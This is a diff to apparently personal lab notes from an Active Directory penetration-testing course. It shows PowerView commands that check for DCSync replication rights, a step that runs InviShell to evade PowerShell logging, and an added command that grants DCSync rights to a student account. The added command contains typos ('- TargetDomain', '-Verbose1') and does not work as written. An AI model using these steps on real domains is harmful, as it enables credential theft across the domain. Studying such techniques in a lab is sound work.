@@ -494,7 +494,7 @@ ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
 *Check if studentx has Replication (DCSync) rights.*
 We can check with this command
 ```powershell
-import-module C:\AD\Tools\PowerView.ps1
+. C:\AD\Tools\PowerView.ps1
 ```
 ```powerview
 Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student115"}
@@ -510,5 +510,9 @@ Run invishell and import powerview
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
 ```powershell
-import-module C:\AD\Tools\PowerView.ps1
+. C:\AD\Tools\PowerView.ps1
+```
+add the permission to student115 
+```powerview
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student115 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local - TargetDomain dollarcorp.moneycorp.local -Verbose1
 ```
